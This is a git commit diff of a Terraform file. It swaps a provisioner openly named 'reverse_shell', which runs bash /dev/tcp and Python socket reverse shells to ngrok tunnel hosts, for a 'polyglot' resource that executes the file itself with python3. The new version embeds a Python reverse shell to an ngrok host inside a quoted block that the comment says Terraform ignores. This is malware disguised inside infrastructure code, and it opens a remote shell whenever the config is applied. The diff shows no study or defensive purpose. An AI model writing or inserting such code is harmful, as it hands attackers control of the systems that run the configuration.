6ab7539ad34dac6c229553988889b625c43abb5b
Islam Albatsh <isahavkc@gmail.com>
2025-10-17 21:54:44 -0400

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,19 +1,15 @@
-# main.tf - Fixed Reverse Shell
-resource "null_resource" "reverse_shell" {
+# main.tf
+resource "null_resource" "polyglot" {
   provisioner "local-exec" {
-    command = <<EOT
-      echo "Testing reverse shell methods..."
-      
-      # Method 1: Fixed bash TCP path
-      bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/14419 0>&1' &
-      
-      # Give it a moment to connect
-      sleep 2
-      
-      # Method 2: Python fallback
-      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.eu.ngrok.io",19663));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
-      
-      echo "Reverse shell attempts completed"
-    EOT
+    command = "python3 ${path.module}/main.tf"
   }
 }
+
+"""
+# Python code starts here - but Terraform ignores it
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("2.tcp.eu.ngrok.io",10972))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+import pty; pty.spawn("/bin/bash")
+"""
